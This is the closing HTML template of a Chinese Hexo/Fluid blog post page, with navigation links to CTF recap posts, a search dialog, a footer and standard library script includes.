                      <a href="/2022/11/09/2022-11-9-%E5%BC%BA%E7%BD%91%E6%8B%9F%E6%80%81%E5%B0%8F%E7%BB%93/">
                        <i class="iconfont icon-arrowleft"></i>
                        <span class="hidden-mobile">强网拟态小结-blockchian&web</span>
                        <span class="visible-mobile">上一篇</span>
                      </a>
                    
                  </article>
                  <article class="post-next col-6">
                    
                    
                      <a href="/2022/11/01/2022-11-1-tctf%E5%B0%8F%E7%BB%93/">
                        <span class="hidden-mobile">TCTF小结</span>
                        <span class="visible-mobile">下一篇</span>
                        <i class="iconfont icon-arrowright"></i>
                      </a>
                    
                  </article>
                </div>
              
            </div>

            
          </article>
        </div>
      </div>
    </div>
    
      <div class="d-none d-lg-block col-lg-2 toc-container" id="toc-ctn">
        <div id="toc">
  <p class="toc-header"><i class="iconfont icon-list"></i>&nbsp;目录</p>
  <div class="toc-body" id="toc-body"></div>
</div>

      </div>
    
  </div>
</div>

<!-- Custom -->

<script type="text/javascript" src="/libs/codeBlock/codeBlockFuction.js"></script>
<!-- 代码语言 -->
<script type="text/javascript" src="/libs/codeBlock/codeLang.js"></script>
<!-- 代码块复制 -->
<script type="text/javascript" src="/libs/codeBlock/codeCopy.js"></script>
<script type="text/javascript" src="/libs/codeBlock/clipboard.min.js"></script>
<!-- 代码块收缩 -->
<script type="text/javascript" src="/libs/codeBlock/codeShrink.js"></script> 
<!-- 代码块折行 -->
<style type="text/css">code[class*="language-"], pre[class*="language-"] { white-space: pre !important; }</style>

    

    
      <a id="scroll-top-button" href="#" role="button">
        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
      </a>
    

    
      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
     aria-hidden="true">
  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
    <div class="modal-content">
      <div class="modal-header text-center">
        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
          <span aria-hidden="true">&times;</span>
        </button>
      </div>
      <div class="modal-body mx-3">
        <div class="md-form mb-5">
          <input type="text" id="local-search-input" class="form-control validate">
          <label data-error="x" data-success="v"
                 for="local-search-input">关键词</label>
        </div>
        <div class="list-group" id="local-search-result"></div>
      </div>
    </div>
  </div>
</div>
    

    
  </main>

  <footer class="text-center mt-5 py-3">
  <div class="footer-content">
     <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
  </div>
  

  
  <!-- 备案信息 -->
  <div class="beian">
    <span>
      <a href="http://beian.miit.gov.cn/" target="_blank" rel="nofollow noopener">
        京ICP备2022002829号
      </a>
    </span>
    
  </div>


  
</footer>


  <!-- SCRIPTS -->
  
  <script  src="https://cdn.jsdelivr.net/npm/nprogress@0.2.0/nprogress.min.js" ></script>
  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/nprogress@0.2.0/nprogress.min.css" />

  <script>
    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
    NProgress.start()
    window.addEventListener('load', function() {
      NProgress.done();
    })
  </script>


<script  src="https://cdn.jsdelivr.net/npm/jquery@3.6.0/dist/jquery.min.js" ></script>
<script  src="https://cdn.jsdelivr.net/npm/bootstrap@4.6.0/dist/js/bootstrap.min.js" ></script>
<script  src="/js/events.js" ></script>
<script  src="/js/plugins.js" ></script>

<!-- Plugins -->


  
    <script  src="/js/img-lazyload.js" ></script>
  



  



  <script  src="https://cdn.jsdelivr.net/npm/tocbot@4.12.3/dist/tocbot.min.js" ></script>



  <script  src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.js" ></script>



  <script  src="https://cdn.jsdelivr.net/npm/anchor-js@4.3.1/anchor.min.js" ></script>



  <script defer src="https://cdn.jsdelivr.net/npm/clipboard@2.0.8/dist/clipboard.min.js" ></script>



  <script  src="/js/local-search.js" ></script>






  <script  src="https://cdn.jsdelivr.net/npm/typed.js@2.0.12/lib/typed.min.js" ></script>
  <script>
    (function (window, document) {
      var typing = Fluid.plugins.typing;
      var title = document.getElementById('subtitle').title;
      
      typing(title)
      
    })(window, document);
  </script>












  

  

  

  

  

  





<!-- 主题的启动项 保持在最底部 -->
<script  src="/js/boot.js" ></script>


</body>
</html>
